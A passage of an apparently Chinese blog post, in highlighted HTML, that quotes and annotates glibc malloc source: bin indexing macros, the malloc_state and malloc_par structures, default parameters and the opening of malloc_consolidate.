class="hljs-meta-keyword">define</span> NSMALLBINS         64</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT <span class="hljs-comment">//32为8, 64为16</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ) <span class="hljs-comment">//暂时不知道这是做啥的, 一般为0</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH) <span class="hljs-comment">//32:512  64:1024</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> in_smallbin_range(sz)  \</span><br><span class="hljs-meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> smallbin_index(sz) \</span><br><span class="hljs-meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span><br><span class="hljs-meta">   + SMALLBIN_CORRECTION)</span><br></code></pre></div></td></tr></table></figure><ul><li><p>可以看到MIN_LARGE_SIZE用作了判断块大小是否位于small bin的范围内</p></li><li><p>small bin 紧跟在unsorted bin之后, 索引从2-63, 大小从(0x20-0x3f0, 注意这是chunk的指针), 所以index只需要移位就可以了, 相邻下标之间<strong>块大小</strong>间隔0x10(64), 0x8(32)</p></li><li><p><strong>small bin和fast bin有一部分范围是重合的</strong> </p></li><li><p><strong>FILO 链头入 链尾出</strong> </p></li></ul><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index_32(sz)                                                \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-meta-string">&lt;= 38) ?  56 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-meta-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-meta-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-meta-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-meta-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index_32_big(sz)                                            \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-meta-string">&lt;= 45) ?  49 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-meta-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-meta-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-meta-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-meta-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index_64(sz)                                                \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-meta-string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-meta-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-meta-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-meta-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-meta-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index(sz) \</span><br><span class="hljs-meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span><br><span class="hljs-meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span><br><span class="hljs-meta">   : largebin_index_32 (sz))</span><br></code></pre></div></td></tr></table></figure><ul><li><p>0x400-0xc30 : idx=64-96, 间隔0x40<br>0xc40-0x29f0: idx=97- , 间隔0x200<br>….</p></li><li><p><strong>从链头(最左边) 到 链尾，沿着各个chunk的fd指针，chunks由大到小，依次排序</strong> </p><ul><li><p>fd_nextsize 指向右一个小于当前 chunk 的第一个空闲块，<strong>不包含 bin 的头节点</strong>。</p></li><li><p>bk_nextsize 指向左一个大于当前 chunk 的第一个空闲块，<strong>不包含 bin 的头节点</strong>。</p></li><li><p>large bin结构:</p></li></ul><p><img src="../../image/glibc_malloc_srcCode/KHlB5YwzDnq1pmZ.png" alt="large-bin"> </p></li></ul><h3 id="Top"><a href="#Top" class="headerlink" title="Top"></a>Top</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Top</span><br><span class="hljs-comment">    The top-most available chunk (i.e., the one bordering the end of</span><br><span class="hljs-comment">    available memory) is treated specially. It is never included in</span><br><span class="hljs-comment">    any bin, is used only if no other chunk is available, and is</span><br><span class="hljs-comment">    released back to the system if it is very large (see</span><br><span class="hljs-comment">    M_TRIM_THRESHOLD).  Because top initially</span><br><span class="hljs-comment">    points to its own bin with initial zero size, thus forcing</span><br><span class="hljs-comment">    extension on the first malloc request, we avoid having any special</span><br><span class="hljs-comment">    code in malloc to check whether it even exists yet. But we still</span><br><span class="hljs-comment">    need to do so when getting memory from system, so we make</span><br><span class="hljs-comment">    initial_top treat the bin as a legal but unusable chunk during the</span><br><span class="hljs-comment">    interval between initialization and the first call to</span><br><span class="hljs-comment">    sysmalloc. (This is somewhat delicate, since it relies on</span><br><span class="hljs-comment">    the 2 preceding words to be zero during this interval as well.)</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* Conveniently, the unsorted bin can be used as dummy top on first call */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> initial_top(M)              (unsorted_chunks (M))</span><br></code></pre></div></td></tr></table></figure><h3 id="总的index"><a href="#总的index" class="headerlink" title="总的index"></a>总的index</h3><pre><code class=" mermaid">graph LRg([bin_index])--&gt;a(smallbin_index) &amp; b(largebin_index)b--&gt;|64|largebin_index_64b--&gt;|32 &amp; MALLOC_ALIGNMENT == 16|m[largebin_index_32_big]b--&gt;|32 &amp; != 16|largebin_index_32</code></pre><h2 id="核心结构体"><a href="#核心结构体" class="headerlink" title="核心结构体"></a>核心结构体</h2><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Serialize access.  */</span><br>  __libc_lock_define (, mutex);<br>  <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>  <span class="hljs-keyword">int</span> flags;<br>  <span class="hljs-comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span><br>  <span class="hljs-comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span><br>  <span class="hljs-keyword">int</span> have_fastchunks;   <span class="hljs-comment">//have_fastchunks是glibc 2.27 及以后特有的, 四字节32位可用</span><br>  <span class="hljs-comment">/* Fastbins */</span><br>  mfastbinptr fastbinsY[NFASTBINS];<br>  <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>  mchunkptr top;<br>  <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>  mchunkptr last_remainder;<br>  <span class="hljs-comment">/* Normal bins packed as described above */</span><br>  mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br>  <span class="hljs-comment">/* Bitmap of bins */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> binmap[BINMAPSIZE];<br>  <span class="hljs-comment">/* Linked list */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">     by free_list_lock in arena.c.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><br>  <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">     the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">     free_list_lock in arena.c.  */</span><br>  INTERNAL_SIZE_T attached_threads;<br>  <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p><strong>flags</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   FASTCHUNKS_BIT held in max_fast indicates that there are probably</span><br><span class="hljs-comment">   some fastbin chunks. It is set true on entering a chunk into any</span><br><span class="hljs-comment">   fastbin, and cleared only in malloc_consolidate.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   The truth value is inverted so that have_fastchunks will be true</span><br><span class="hljs-comment">   upon startup (since statics are zero-filled), simplifying</span><br><span class="hljs-comment">   initialization checks.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FASTCHUNKS_BIT        (1U)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> have_fastchunks(M)     (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> clear_fastchunks(M)    catomic_or (&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_fastchunks(M)      catomic_and (&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span><br></code></pre></div></td></tr></table></figure><p><strong>Binmap</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Binmap</span><br><span class="hljs-comment">    To help compensate for the large number of bins, a one-level index</span><br><span class="hljs-comment">    structure is used for bin-by-bin searching.  `binmap&#x27; is a</span><br><span class="hljs-comment">    bitvector recording whether bins are definitely empty so they can</span><br><span class="hljs-comment">    be skipped over during during traversals.  The bits are NOT always</span><br><span class="hljs-comment">    cleared as soon as bins are empty, but instead only</span><br><span class="hljs-comment">    when they are noticed to be empty during traversal in malloc.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* Conservatively use 32 bits per map word, even if on 64bit system */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINMAPSHIFT      5</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BITSPERMAP       (1U &lt;&lt; BINMAPSHIFT)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BINMAPSIZE       (NBINS / BITSPERMAP)<span class="hljs-comment">//32 bits per map word,every bit is useful</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> idx2block(i)     ((i) &gt;&gt; BINMAPSHIFT)<span class="hljs-comment">//第6位及以后确定block</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> idx2bit(i)       ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))<span class="hljs-comment">//i &amp; 31:取出低5位决定在block中的bit</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp;= ~(idx2bit (i)))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp; idx2bit (i))</span><br></code></pre></div></td></tr></table></figure><h3 id="malloc-par"><a href="#malloc-par" class="headerlink" title="malloc_par"></a>malloc_par</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span> //<span class="hljs-title">malloc</span> <span class="hljs-title">parameter</span>, 堆管理器的相关参数</span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Tunable parameters */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> trim_threshold;<br>  INTERNAL_SIZE_T top_pad;<br>  INTERNAL_SIZE_T mmap_threshold;<br>  INTERNAL_SIZE_T arena_test;<br>  INTERNAL_SIZE_T arena_max;<br><br>  <span class="hljs-comment">/* Memory map support */</span><br>  <span class="hljs-keyword">int</span> n_mmaps;<br>  <span class="hljs-keyword">int</span> n_mmaps_max;<br>  <span class="hljs-keyword">int</span> max_n_mmaps;<br>  <span class="hljs-comment">/* the mmap_threshold is dynamic, until the user sets</span><br><span class="hljs-comment">     it manually, at which point we need to disable any</span><br><span class="hljs-comment">     dynamic behavior. */</span><br>  <span class="hljs-keyword">int</span> no_dyn_threshold;<br><br>  <span class="hljs-comment">/* Statistics */</span><br>  INTERNAL_SIZE_T mmapped_mem;<br>  INTERNAL_SIZE_T max_mmapped_mem;<br><br>  <span class="hljs-comment">/* First address handed out by MORECORE/sbrk.  */</span><br>  <span class="hljs-keyword">char</span> *sbrk_base;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* Maximum number of buckets to use.  */</span><br>  <span class="hljs-keyword">size_t</span> tcache_bins;<br>  <span class="hljs-keyword">size_t</span> tcache_max_bytes;<br>  <span class="hljs-comment">/* Maximum number of chunks in each bucket.  */</span><br>  <span class="hljs-keyword">size_t</span> tcache_count;<br>  <span class="hljs-comment">/* Maximum number of chunks to remove from the unsorted list, which</span><br><span class="hljs-comment">     aren&#x27;t used to prefill the cache.  */</span><br>  <span class="hljs-keyword">size_t</span> tcache_unsorted_limit;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>当每个分配区的 top chunk 大小大于<strong>trim_threshold</strong>时，在一定的条件下，调用 free 时会收缩内存，减小 top chunk 的大小。</li><li><strong>top_pad</strong> 字段表示在分配内存时是否添加额外的 pad，默认该字段为 0。 </li><li><strong>mmap_threshold</strong> 字段表示 mmap 分配阈值，默认值为 128KB，在 32 位系统上最大值为 512KB，64 位系统上的最大值为 32MB，由于默认开启 mmap 分配阈值动态调整，该字段的 值会动态修改，但不会超过最大值。 </li><li><strong>arena_test</strong> 和 <strong>arena_max</strong> 用于 PER_THREAD 优化，在 32 位系统上 arena_test 默认值为 2， 64 位系统上的默认值为 8，当每个进程的分配区数量小于等于 arena_test 时，不会重用已有 的分配区。为了限制分配区的总数，用 arena_max 来保存分配区的最大数量，当系统中的分 配区数量达到 arena_max，就不会再创建新的分配区，只会重用已有的分配区。这两个字段 都可以使用 mallopt()函数设置。 </li><li><strong>n_mmaps</strong> 字段表示当前进程使用 mmap()函数分配的内存块的个数。 </li><li><strong>n_mmaps_max</strong> 字段表示进程使用 mmap()函数分配的内存块的最大数量，默认值为65536，可以使用 mallopt()函数修改</li><li><strong>max_n_mmaps</strong> 字段表示当前进程使用 mmap()函数分配的内存块的数量的最大值，有关系 n_mmaps &lt;= max_n_mmaps 成立。这个字段是由于 mstats()函数输出统计需要这个字段。 </li><li><strong>no_dyn_threshold</strong> 字段表示是否开启 mmap 分配阈值动态调整机制，默认值为 0，也就 是默认开启 mmap 分配阈值动态调整机制。 </li><li><strong>pagesize</strong> 字段表示系统的页大小，默认为 4KB。 </li><li><strong>mmapped_mem</strong> 和 <strong>max_mmapped_mem</strong> 都用于统计 mmap 分配的内存大小，一般情况 下两个字段的值相等，max_mmapped_mem 用于 mstats()函数。 </li><li><strong>max_total_mem</strong> 字段在单线程情况下用于统计进程分配的内存总数。 </li><li><strong>sbrk_base</strong> 字段表示堆的起始地址。</li></ul><h3 id="main-arena"><a href="#main-arena" class="headerlink" title="main_arena"></a>main_arena</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> <span class="hljs-title">main_arena</span> =</span> <span class="hljs-comment">//main_arena是一个里libc中的全局静态变量</span><br>&#123;<br>  .mutex = _LIBC_LOCK_INITIALIZER,<br>  .next = &amp;main_arena,<br>  .attached_threads = <span class="hljs-number">1</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="mp"><a href="#mp" class="headerlink" title="mp_"></a>mp_</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* There is only one instance of the malloc parameters.  */</span><br><br><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span> <span class="hljs-title">mp_</span> =</span><br>&#123;<br>  .top_pad = DEFAULT_TOP_PAD,<br>  .n_mmaps_max = DEFAULT_MMAP_MAX,<br>  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,<br>  .trim_threshold = DEFAULT_TRIM_THRESHOLD,<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span><br>  .arena_test = NARENAS_FROM_NCORES (<span class="hljs-number">1</span>)<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  ,<br>  .tcache_count = TCACHE_FILL_COUNT,<br>  .tcache_bins = TCACHE_MAX_BINS,<br>  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="hljs-number">-1</span>),<br>  .tcache_unsorted_limit = <span class="hljs-number">0</span> <span class="hljs-comment">/* No limit.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>设置了<code>top_pad</code>为 0</li><li>设置了<code>n_maps_max</code>为 65535</li><li>设置了<code>mmap_threshold</code>为 128 * 1024</li><li>设置了<code>trim_threshold</code>为 128 * 1024</li><li>设置了<code>arena_test</code>在gcc中32下为2，64位下为8（不同的编译器中long的长度可能不同，这里仅以gcc为例）</li></ul><h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a><span id="malloc_consolidate"><strong>malloc_consolidate</strong></span></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  ------------------------- malloc_consolidate -------------------------</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  malloc_consolidate is a specialized version of free() that tears</span><br><span class="hljs-comment">  down chunks held in fastbins.  Free itself cannot be used for this</span><br><span class="hljs-comment">  purpose since, among other things, it might place chunks back onto</span><br><span class="hljs-comment">  fastbins.  So, instead, we need to use a minor variant of the same</span><br><span class="hljs-comment">  code.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  Also, because this routine needs to be called the first time through</span><br><span class="hljs-comment">  malloc anyway, it turns out to be the perfect place to trigger</span><br><span class="hljs-comment">  initialization code.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">malloc_consolidate</span><span class="hljs-params">(mstate av)</span></span><br><span class="hljs-function"></span>&#123;<br>  mfastbinptr*    fb;                 <span class="hljs-comment">/* current fastbin being consolidated */</span><br>  mfastbinptr*    maxfb;              <span class="hljs-comment">/* last fastbin (for loop control) */</span><br>  mchunkptr       p;                  <span class="hljs-comment">/* current chunk being consolidated */</span><br>  mchunkptr       nextp;              <span class="hljs-comment">/* next chunk to consolidate */</span><br>  mchunkptr       unsorted_bin;       <span class="hljs-comment">/* bin header */</span><br>  mchunkptr       first_unsorted;     <span class="hljs-comment">/* chunk to link to */</span><br><br>  <span class="hljs-comment">/* These have same use as in free() */</span><br>  mchunkptr       nextchunk;<br>  INTERNAL_SIZE_T size;<br>  INTERNAL_SIZE_T nextsize;<br>  INTERNAL_SIZE_T prevsize;<br>  <span class="hljs-keyword">int</span>             nextinuse;<br>  mchunkptr       bck;<br>  mchunkptr       fwd;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      If max_fast is 0, we know that av hasn&#x27;t</span><br><span class="hljs-comment">      yet been initialized, in which case do so below</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">// 说明 fastbin 已经初始化</span><br>    <span class="hljs-keyword">if</span> (get_max_fast() != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 清空 fastbin 标记</span><br>        <span class="hljs-comment">// 因为要合并 fastbin 中的 chunk 了。</span><br>        clear_fastchunks(av);<br>        